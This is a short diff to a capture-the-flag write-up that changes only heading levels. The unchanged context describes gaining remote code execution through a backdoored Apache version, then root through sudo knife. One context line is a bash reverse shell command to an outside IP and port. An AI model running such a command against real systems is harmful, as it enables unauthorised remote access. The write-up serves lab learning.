@@ -4,7 +4,7 @@ Nmap scan
 
 <figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
-## Site exploitation
+# Site exploitation
 
 Googling this version of apache we can see someone left a backdoor in it that allows for RCE. This was really fasicinating to read up about and incredibly easy to exploit see [this ](https://www.exploit-db.com/exploits/49933)on exploit db and the bellow wireshark.
 
@@ -18,7 +18,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.16.5/9000 0>&1'
 
 And we have a shell and the user flag!!
 
-## Priv esc
+# Priv esc
 
 This was a very simple one. Running sudo -l shows us we can run knife as root we can use [this ](https://gtfobins.github.io/gtfobins/knife/)priv esc to gain a root shell.
 
